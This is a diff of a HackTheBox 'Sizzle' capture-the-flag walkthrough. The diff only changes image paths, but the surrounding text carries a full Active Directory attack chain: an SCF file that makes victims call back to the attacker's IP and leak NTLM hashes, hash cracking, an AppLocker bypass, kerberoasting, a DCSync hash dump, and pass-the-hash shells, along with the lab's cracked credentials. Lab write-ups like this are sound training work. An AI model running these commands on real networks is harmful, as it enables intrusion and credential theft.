@@ -124,18 +124,18 @@
             <p>Based from the nmap scan there is FTP with anonymous access and HTTP/HTTPS and smb and ldap. Lets start with FTP.</p>
             <h2>FTP Enumeration</h2>
             <p>In order to log into FTP anonymously we need to have the username and password set as anonymous. Once logged in there was nothing in the ftp server.</p>
-            <img src="/images/sizzle-ftp.png" alt="Sizzle ftp">
+            <img src="/Website/images/sizzle-ftp.png" alt="Sizzle ftp">
             <h2>HTTP Enumeration</h2>
             <p>Viewing the http only shows up a gif image of a bacon and viewing the html source code shows nothing interesting.</p>
-            <img src="/images/sizzle-http.png" alt="Sizzle http">
+            <img src="/Website/images/sizzle-http.png" alt="Sizzle http">
             <p>I will run ffuf to scan for directories for further enumeration. I will first use the IIS.FUZZ.txt wordlist since we know it is running off from IIS server before running the usual directory-list-lowercase-2.3-medium.txt wordlist.</p>
             <div class="snippet">
                 <code>ffuf -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt:FUZZ -u http://10.10.10.103/FUZZ -t 1000 -e .php,.txt,.aspx,.asp</code>
             </div>
             <br />
-            <img src="/images/sizzle-ffuf.png" alt="Sizzle ffuf">
+            <img src="/Website/images/sizzle-ffuf.png" alt="Sizzle ffuf">
             <p>As we can see there are directories but it is forbidden and authorized. I checked the certsrv directory which required credentials.</p>
-            <img src="/images/sizzle-login.png" alt="Sizzle login">
+            <img src="/Website/images/sizzle-login.png" alt="Sizzle login">
             <p>This is as much as web enumeration I was able to gather lets move onto smb enumeration.</p>
             <h2>SMB Enumeration</h2>
             <p>I will use smbmap to view if we have smb anonymous access and to what shares do we have access to.</p>
@@ -143,26 +143,26 @@
                 <code>smbmap -u 'guest' -p '' -H 10.10.10.103</code>
             </div>
             <br />
-            <img src="/images/sizzle-smb-share.png" alt="Sizzle smb">
+            <img src="/Website/images/sizzle-smb-share.png" alt="Sizzle smb">
             <p>We have access to two shares which is the Department Shares and the IPC$ share. Lets view the contents from both shares with smbmap before manually enumerating the shares. This will list all the files and directories from the shares.</p>
             <div class="snippet">
                 <code>smbmap -u 'guest' -p '' -H 10.10.10.103 --depth 10 -r</code>
             </div>
             <br />
             <div class="big-to-normal-image">
-                <img src="/images/sizzle-smb-shares.png" alt="Sizzle shares">
+                <img src="/Website/images/sizzle-smb-shares.png" alt="Sizzle shares">
             </div>
             <p>Which there was nothing interesting files in any directory however there is a user directory which we may have access to upload a file. If we do have access to upload a file to someones directory we can perform a SCF file attack. The SCF file otherwise known as a Shell Command Files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. We will make it where it will point to our ip and set up responder to be able to catch the ntlm hash.</p>
             <p>Lets first see if we have any upload access to any users. We will write a basic one liner to connect to the share and upload a file and see if we are able to. First I will make a file called test.txt and that will be used to upload to a user. Next we will have to get all the usernames from the users directory and place it in a users.txt file.</p>
             <div class="big-to-normal-image">
-                <img src="/images/Sizzle-smb-enum.png" alt="Sizzle smb enum">
+                <img src="/Website/images/Sizzle-smb-enum.png" alt="Sizzle smb enum">
             </div>
             <p>Now lets run our one liner.</p>
             <div class="snippet">
                 <code>for users in $(cat users.txt); do smbclient -D "\Users" -N -c "prompt; cd $users; put test.txt; dir" "\\\\10.10.10.103\\Department Shares"; done</code>
             </div>
             <br />
-            <img src="/images/sizzle-smb-write.png" alt="Sizzle smb write">
+            <img src="/Website/images/sizzle-smb-write.png" alt="Sizzle smb write">
             <p>We can put test.txt in the Public user directory. It is worth a shot to see if we are able to get anything back. Lets make the SCF file. Name the file @file.scf</p>
             <div class="snippet">
                 <code>[Shell]<br />Command=2<br />IconFile=\\10.10.14.2\share\legit.ico<br />[Taskbar]<br />Command=ToggleDesktop</code>
@@ -173,7 +173,7 @@
             </div>
             <p>Then upload the file to users\Public share and wait for the hash.</p>
             <div class="small-to-big-image">
-                <img src="/images/Sizzle-ntlm-hash.png" alt="Sizzle ntlm hash">
+                <img src="/Website/images/Sizzle-ntlm-hash.png" alt="Sizzle ntlm hash">
             </div>
             <p>Now we will try to attempt to crack the hash with hashcat.</p>
             <div class="snippet">
@@ -181,20 +181,20 @@
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-hash-cracked.png" alt="Sizzle hash cracked">
+                <img src="/Website/images/sizzle-hash-cracked.png" alt="Sizzle hash cracked">
             </div>
             <p>Which now we got our first user credentials.</p>
             <div class="small-to-big-image">
-                <img src="/images/sizzle-smb-enum-user.png" alt="Sizzle user smb enum">
+                <img src="/Website/images/sizzle-smb-enum-user.png" alt="Sizzle user smb enum">
             </div>
             <p>We have new access such as CertEnroll directory. Lets check that out first.</p>
             <h2>Foothold</h2>
-            <img src="/images/sizzle-smb-cert.png" alt="Sizzle smb cert">
+            <img src="/Website/images/sizzle-smb-cert.png" alt="Sizzle smb cert">
             <p>It does not seem much so lets try to log into winrm which gives us an error so lets try to log into the website of http://10.10.10.103/certsrv/</p>
             <p>Providing the amanda credentials we manage to log in.</p>
-            <img src="/images/Sizzle-cert-enum.png" alt="Sizzle cert enum">
+            <img src="/Website/images/Sizzle-cert-enum.png" alt="Sizzle cert enum">
             <p>From here we can navigate into Request a certificate then advanced certificate request.</p>
-            <img src="/images/sizzle-cert-gen.png" alt="Sizzle cert gen">
+            <img src="/Website/images/sizzle-cert-gen.png" alt="Sizzle cert gen">
             <p>Once in this page. We can make a certificate via openssl and it will generate a certificate for us to use and put it in the saved request which will generate us a certificate as the user amanda. With that we are able to extract the key and pem and use it to log in via winrm as the user.</p>
             <p>Let's first start by making the certificate.</p>
             <div class="snippet">
@@ -202,57 +202,57 @@
             </div>
             <br />
             <p>Leave everything blank and it should generate a private.key and a request.csr. Cat the request.csr and paste it into the saved request section.</p>
-            <img src="/images/Sizzle-cert-gen-user.png" alt="Sizzle cert user gen">
+            <img src="/Website/images/Sizzle-cert-gen-user.png" alt="Sizzle cert user gen">
             <p>As so and now click on submit. Click on base64 and download certificate.</p>
-            <img src="/images/sizzle-cert-download.png" alt="Sizzle cert download">
+            <img src="/Website/images/sizzle-cert-download.png" alt="Sizzle cert download">
             <p>Since we have the crt downloaded and we generated the certificate we have the private key. We can winrm with the certificate we downloaded and private key.</p>
             <div class="snippet">
                 <code>evil-winrm -S -i 10.10.10.103 -u amanda -p 'Ashare1972' -c certnew.cer  -k private.key</code>
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-user-pwn.png" alt="Sizzle user pwn">
+                <img src="/Website/images/sizzle-user-pwn.png" alt="Sizzle user pwn">
             </div>
             <p>As we can see we are logged in as amanda. I tried to upload some of my tools such as SharpHound however it does not upload.</p>
             <div class="small-to-big-image">
-                <img src="/images/sizzle-file-upload-blocked.png" alt="Sizzle file upload blocked">
+                <img src="/Website/images/sizzle-file-upload-blocked.png" alt="Sizzle file upload blocked">
             </div>
             <p>We know we can upload files from the smb share so lets try that.</p>
-            <img src="/images/sizzle-file-upload-bypass.png" alt="Sizzle file upload bypass">
+            <img src="/Website/images/sizzle-file-upload-bypass.png" alt="Sizzle file upload bypass">
             <p>It uploaded successfully so lets now try to move the file onto the amanda’s directory.</p>
-            <img src="/images/sizzle-file-bypass.png" alt="Sizzle file bypass">
+            <img src="/Website/images/sizzle-file-bypass.png" alt="Sizzle file bypass">
             <div class="snippet">
                 <code>move-item Rubeus.exe C:\Users\Amanda\<br />move-item SharpHound.exe C:\Users\Amanda\</code>
             </div>
             <br />
-            <img src="/images/sizzle-file-check.png" alt="Sizzle file check">
+            <img src="/Website/images/sizzle-file-check.png" alt="Sizzle file check">
             <p>Now I tried to run Rubeus.exe and SharpHound however they both are blocked</p>
             <div class="small-to-big-image">
-                <img src="/images/sizzle-app-blocked.png" alt="Sizzle app blocked">
+                <img src="/Website/images/sizzle-app-blocked.png" alt="Sizzle app blocked">
             </div>
             <p>It is AppLocker at work. We can try to bypass AppLocker from this amazing list<br /><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md">https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md</a></p>
             <h2>Privilege Escalation</h2>
             <p>Moving the files to C:\Windows\temp and running the files worked!</p>
-            <img src="/images/sizzle-app-bypass.png" alt="Sizzle app bypass">
+            <img src="/Website/images/sizzle-app-bypass.png" alt="Sizzle app bypass">
             <p>Before running rebeus, lets check if it has port 88 running locally.</p>
             <div class="snippet">
                 <code>netstat -ap tcp</code>
             </div>
             <br />
-            <img src="/images/sizzle-netstat.png" alt="Sizzle netstat">
+            <img src="/Website/images/sizzle-netstat.png" alt="Sizzle netstat">
             <p>It does so now lets check for kerberoastable users.</p>
             <div class="snippet">
                 <code>.\Rebeus kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code>
             </div>
             <br />
-            <img src="/images/sizzle-kerberoast.png" alt="Sizzle kerberoasting">
+            <img src="/Website/images/sizzle-kerberoast.png" alt="Sizzle kerberoasting">
             <p>Only one user hash. Lets try to crack the hash.</p>
             <div class="snippet">
                 <code>hashcat hash /usr/share/wordlist/rockyou.txt</code>
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-kerb-hash-cracked.png" alt="Sizzle kerb hash cracked">
+                <img src="/Website/images/sizzle-kerb-hash-cracked.png" alt="Sizzle kerb hash cracked">
             </div>
             <p>We cracked the users password. Lets try to winrm as the user mrlky.</p>
             <div class="snippet">
@@ -260,7 +260,7 @@
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-login-error.png" alt="Sizzle winrm login error">
+                <img src="/Website/images/sizzle-login-error.png" alt="Sizzle winrm login error">
             </div>
             <p>It errors out hmmm lets try to run bloodhound and see what we can do.</p>
             <div class="snippet">
@@ -268,25 +268,25 @@
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-bloodhound.png" alt="Sizzle bloodhound">
+                <img src="/Website/images/sizzle-bloodhound.png" alt="Sizzle bloodhound">
             </div>
             <p>In bloodhound the user mrlky has dcsync rights to the domain controller which we can use to dump the hashes of the domain.</p>
             <div class="small-to-big-image">
-                <img src="/images/sizzle-bloodhound-view.png" alt="Sizzle bloodhound view">
+                <img src="/Website/images/sizzle-bloodhound-view.png" alt="Sizzle bloodhound view">
             </div>
             <p>Lets dump the hashes of the domain and perform pass the hash on the administrator’s hash to log in.</p>
             <div class="snippet">
                 <code>secretsdump.py htb.local/mrlky:Football#7@10.10.10.103</code>
             </div>
             <br />
-            <img src="/images/sizzle-hash-dump.png" alt="domain hash dump">
+            <img src="/Website/images/sizzle-hash-dump.png" alt="domain hash dump">
             <p>Now lets try to winrm as administrator with the hash</p>
             <div class="snippet">
                 <code>evil-winrm -i 10.10.10.103 -u administrator -H f6b7160bfc91823792e0ac3a162c9267</code>
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-winrm-error.png" alt="Sizzle winrm error">
+                <img src="/Website/images/sizzle-winrm-error.png" alt="Sizzle winrm error">
             </div>
             <p>I still get access denied which I found weird so just to make sure I ran netexec to see if I can log in via hash.</p>
             <div class="snippet">
@@ -294,14 +294,14 @@
             </div>
             <br />
             <div class="small-to-big-image">
-                <img src="/images/sizzle-administrator-pwn.png" alt="Sizzle administrator pwn">
+                <img src="/Website/images/sizzle-administrator-pwn.png" alt="Sizzle administrator pwn">
             </div>
             <p>It shows that I can log in as the user but winrm will not let me however there is another tool called psexec to gain a shell which is what I will use.</p>
             <div class="snippet">
                 <code>psexec.py administrator@10.10.10.103 -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267</code>
             </div>
             <br />
-            <img src="/images/sizzle-administrator-login.png" alt="Sizzle administrator login">
+            <img src="/Website/images/sizzle-administrator-login.png" alt="Sizzle administrator login">
             <h2>Conclusion</h2>
             <p>Sizzle was an incredibly challenging and rewarding box that pushed my pen testing skills to the limit. It required a deep understanding of Active Directory, advanced enumeration techniques, and creative problem-solving to identify and exploit vulnerabilities. Each step was a learning experience, from tackling unconventional footholds to navigating the intricate privilege escalation path.</p>
         </div>
